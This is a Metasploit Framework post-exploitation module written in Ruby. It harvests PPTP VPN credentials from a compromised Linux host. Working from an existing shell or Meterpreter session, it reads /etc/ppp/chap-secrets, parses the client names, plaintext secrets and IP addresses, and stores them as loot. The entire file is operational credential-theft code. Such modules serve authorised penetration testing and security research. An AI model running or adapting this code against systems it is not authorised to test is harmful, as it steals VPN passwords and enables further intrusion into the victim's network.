##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Gather PPTP VPN chap-secrets Credentials',
      'Description'   => %q{
          This module collects PPTP VPN information such as client, server, password,
        and IP from your target server's chap-secrets file.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ "shell", "meterpreter" ]
    ))

    register_options(
      [
        OptString.new('FILE', [true, 'The default path for chap-secrets', '/etc/ppp/chap-secrets'])
      ], self.class)
  end


  #
  # Reads chap_secrets
  #
  def load_file(fname)
    begin
      data = cmd_exec("cat #{fname}")
    rescue RequestError => e
      print_error("Failed to retrieve file. #{e.message}")
      data = ''
    end

    if data =~ /^#{fname}: regular file, no read permission$/ or data =~ /Permission denied$/
      return :access_denied
    elsif data =~ /\(No such file or directory\)$/
      return :not_found
    elsif data.empty?
      return :empty
    end

    return data
  end


  #
  # Extracts client, server, secret, and IP addresses
  #
  def extract_secrets(data)
    tbl = Rex::Ui::Text::Table.new({
      'Header'  => 'PPTPd chap-secrets',
      'Indent'  => 1,
      'Columns' => ['Client', 'Server', 'Secret', 'IP']
    })

    data.each_line do |l|
      # If this line is commented out, ignore it
      next if l =~ /^[[:blank:]]*#/

      found = l.split

      # Nothing is found, skip!
      next if found.empty?

      client = (found[0] || '').strip
      server = (found[1] || '').strip
      secret = (found[2] || '').strip
      ip     = (found[3,found.length] * ", " || '').strip

      report_auth_info({
        :host   => session.session_host,
        :port   => 1723, #PPTP port
        :sname  => 'pptp',
        :user   => client,
        :pass   => secret,
        :type   => 'password',
        :active => true
      })

      tbl << [client, server, secret, ip]
    end

    if tbl.rows.empty?
      print_status("This file has no secrets: #{datastore['FILE']}")
    else
      print_line(tbl.to_s)

      p = store_loot(
        'linux.chapsecrets.creds',
        'text/csv',
        session,
        tbl.to_csv,
        File.basename(datastore['FILE'] + ".txt")
      )
      print_good("Secrets stored in: #{p}")
    end
  end


  def run
    fname = datastore['FILE']
    f     = load_file(fname)

    case f
    when :access_denied
      print_error("No permission to read: #{fname}")
    when :not_found
      print_error("Not found: #{fname}")
    when :empty
      print_status("File is actually empty: #{fname}")
    else
      extract_secrets(f)
    end
  end

end